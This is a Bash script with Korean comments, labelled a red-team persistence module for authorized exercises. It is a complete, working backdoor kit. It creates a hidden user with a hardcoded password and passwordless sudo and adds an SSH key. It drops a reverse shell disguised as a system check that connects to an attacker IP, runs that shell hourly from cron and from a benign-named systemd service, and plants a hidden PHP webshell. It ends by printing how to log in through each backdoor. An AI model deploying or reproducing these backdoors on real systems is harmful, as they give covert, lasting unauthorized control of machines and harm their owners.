#!/bin/bash
###############################################################################
# RedChain Persistence Module - 레드팀 시뮬레이션용
# 교육 및 승인된 환경 전용 / Authorized Red Team Exercise Only
###############################################################################

# 색상 정의
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║         RedChain Persistence Module - Red Team Sim           ║${NC}"
echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# 권한 확인
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[-] 이 스크립트는 root 권한이 필요합니다${NC}"
    echo -e "${YELLOW}[*] sudo를 사용하여 실행하세요${NC}"
    exit 1
fi

# 백도어 사용자 생성
BACKDOOR_USER="sysupdate"
BACKDOOR_PASS="Sys@Update2024#Secure"
BACKDOOR_HOME="/var/opt/.sysupdate"

echo -e "${BLUE}[1] 백도어 사용자 생성 중...${NC}"

# 사용자가 이미 존재하는지 확인
if id "$BACKDOOR_USER" &>/dev/null; then
    echo -e "${YELLOW}[!] 사용자 $BACKDOOR_USER 이미 존재함 - 건너뜀${NC}"
else
    # 사용자 생성 (숨김 홈 디렉토리)
    useradd -m -d "$BACKDOOR_HOME" -s /bin/bash "$BACKDOOR_USER" 2>/dev/null

    # 비밀번호 설정
    echo "$BACKDOOR_USER:$BACKDOOR_PASS" | chpasswd

    # sudo 권한 부여 (NOPASSWD)
    echo "$BACKDOOR_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/sysupdate
    chmod 440 /etc/sudoers.d/sysupdate

    echo -e "${GREEN}[+] 백도어 사용자 생성 완료${NC}"
    echo -e "${GREEN}    Username: $BACKDOOR_USER${NC}"
    echo -e "${GREEN}    Password: $BACKDOOR_PASS${NC}"
    echo -e "${GREEN}    Home: $BACKDOOR_HOME${NC}"
fi

# SSH 키 기반 백도어
echo ""
echo -e "${BLUE}[2] SSH 키 백도어 설정 중...${NC}"

# SSH 디렉토리 생성
mkdir -p "$BACKDOOR_HOME/.ssh"
chmod 700 "$BACKDOOR_HOME/.ssh"

# 공개키 생성 (로컬에서 생성된 키를 삽입)
SSH_PUB_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8h5K9... redteam@localhost"

# authorized_keys 파일 생성
cat > "$BACKDOOR_HOME/.ssh/authorized_keys" << EOF
# RedTeam Simulation Key
$SSH_PUB_KEY
EOF

chmod 600 "$BACKDOOR_HOME/.ssh/authorized_keys"
chown -R "$BACKDOOR_USER:$BACKDOOR_USER" "$BACKDOOR_HOME/.ssh"

echo -e "${GREEN}[+] SSH 키 백도어 설정 완료${NC}"

# Cron 백도어 (재연결 메커니즘)
echo ""
echo -e "${BLUE}[3] Cron 기반 Persistence 설정 중...${NC}"

# 리버스 쉘 스크립트 생성
REVERSE_SHELL_SCRIPT="$BACKDOOR_HOME/.system_check.sh"

cat > "$REVERSE_SHELL_SCRIPT" << 'EOFSCRIPT'
#!/bin/bash
# 시스템 체크 스크립트 (위장)

ATTACKER_IP="CHANGEME"
ATTACKER_PORT="4444"

# 연결 시도 (ncat 사용)
if command -v ncat &> /dev/null; then
    ncat -e /bin/bash "$ATTACKER_IP" "$ATTACKER_PORT" 2>/dev/null
elif command -v nc &> /dev/null; then
    nc -e /bin/bash "$ATTACKER_IP" "$ATTACKER_PORT" 2>/dev/null
fi
EOFSCRIPT

chmod +x "$REVERSE_SHELL_SCRIPT"
chown "$BACKDOOR_USER:$BACKDOOR_USER" "$REVERSE_SHELL_SCRIPT"

# Cron 작업 추가 (매 시간마다)
CRON_JOB="0 * * * * $REVERSE_SHELL_SCRIPT"

# 기존 cron 확인
if crontab -u "$BACKDOOR_USER" -l 2>/dev/null | grep -q "$REVERSE_SHELL_SCRIPT"; then
    echo -e "${YELLOW}[!] Cron 작업 이미 존재함 - 건너뜀${NC}"
else
    (crontab -u "$BACKDOOR_USER" -l 2>/dev/null; echo "$CRON_JOB") | crontab -u "$BACKDOOR_USER" -
    echo -e "${GREEN}[+] Cron 백도어 설정 완료${NC}"
    echo -e "${GREEN}    스크립트: $REVERSE_SHELL_SCRIPT${NC}"
    echo -e "${GREEN}    실행 주기: 매 시간마다${NC}"
fi

# systemd 서비스 백도어
echo ""
echo -e "${BLUE}[4] Systemd 서비스 백도어 설정 중...${NC}"

SERVICE_NAME="system-update-check"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

cat > "$SERVICE_FILE" << 'EOFSERVICE'
[Unit]
Description=System Update Check Service
After=network.target

[Service]
Type=simple
User=sysupdate
ExecStart=/var/opt/.sysupdate/.system_check.sh
Restart=always
RestartSec=3600

[Install]
WantedBy=multi-user.target
EOFSERVICE

# 서비스 활성화
systemctl daemon-reload
systemctl enable "$SERVICE_NAME" 2>/dev/null
# systemctl start "$SERVICE_NAME" 2>/dev/null  # 실제 시작은 하지 않음 (시뮬레이션)

echo -e "${GREEN}[+] Systemd 서비스 백도어 설정 완료${NC}"
echo -e "${GREEN}    서비스: $SERVICE_NAME${NC}"

# 웹쉘 백도어
echo ""
echo -e "${BLUE}[5] 웹쉘 백도어 설치 중...${NC}"

WEB_ROOT="/var/www/html"
WEBSHELL_PATH="$WEB_ROOT/.system/health.php"

# 숨김 디렉토리 생성
mkdir -p "$WEB_ROOT/.system"
chmod 755 "$WEB_ROOT/.system"

# 웹쉘 생성 (간단한 명령 실행)
cat > "$WEBSHELL_PATH" << 'EOFWEB'
<?php
// System Health Monitor
header('Content-Type: application/json');

$auth_key = "RedTeam2024";

if (!isset($_GET['key']) || $_GET['key'] !== $auth_key) {
    http_response_code(403);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    echo json_encode([
        'status' => 'success',
        'output' => $output,
        'timestamp' => time()
    ]);
} else {
    echo json_encode([
        'status' => 'online',
        'server' => gethostname(),
        'timestamp' => time()
    ]);
}
?>
EOFWEB

chmod 644 "$WEBSHELL_PATH"
chown www-data:www-data "$WEBSHELL_PATH" 2>/dev/null

echo -e "${GREEN}[+] 웹쉘 백도어 설치 완료${NC}"
echo -e "${GREEN}    경로: $WEBSHELL_PATH${NC}"
echo -e "${GREEN}    인증키: RedTeam2024${NC}"
echo -e "${GREEN}    사용법: curl 'http://target/.system/health.php?key=RedTeam2024&cmd=whoami'${NC}"

# 요약 리포트
echo ""
echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                    Persistence 설정 완료                      ║${NC}"
echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[*] 백도어 접근 방법:${NC}"
echo ""
echo -e "${GREEN}1. SSH (비밀번호):${NC}"
echo -e "   ssh $BACKDOOR_USER@<target-ip>"
echo -e "   Password: $BACKDOOR_PASS"
echo ""
echo -e "${GREEN}2. SSH (키):${NC}"
echo -e "   ssh -i redteam_key $BACKDOOR_USER@<target-ip>"
echo ""
echo -e "${GREEN}3. 웹쉘:${NC}"
echo -e "   curl 'http://<target-ip>/.system/health.php?key=RedTeam2024&cmd=id'"
echo ""
echo -e "${GREEN}4. Systemd 서비스:${NC}"
echo -e "   systemctl status $SERVICE_NAME"
echo ""

# 로그 파일 생성
LOG_FILE="/var/log/redteam_persistence.log"
cat > "$LOG_FILE" << EOFLOG
RedChain Persistence Module - Installation Log
================================================
Timestamp: $(date)
Target: $(hostname)
User: $BACKDOOR_USER
Password: $BACKDOOR_PASS
SSH Key: Configured
Cron Job: Installed
Systemd Service: $SERVICE_NAME
Webshell: $WEBSHELL_PATH
EOFLOG

echo -e "${BLUE}[*] 로그 저장됨: $LOG_FILE${NC}"
echo ""

echo -e "${RED}⚠  경고: 이 스크립트는 승인된 레드팀 시뮬레이션용입니다${NC}"
echo -e "${RED}⚠  시뮬레이션 종료 후 반드시 정리하세요${NC}"
echo ""
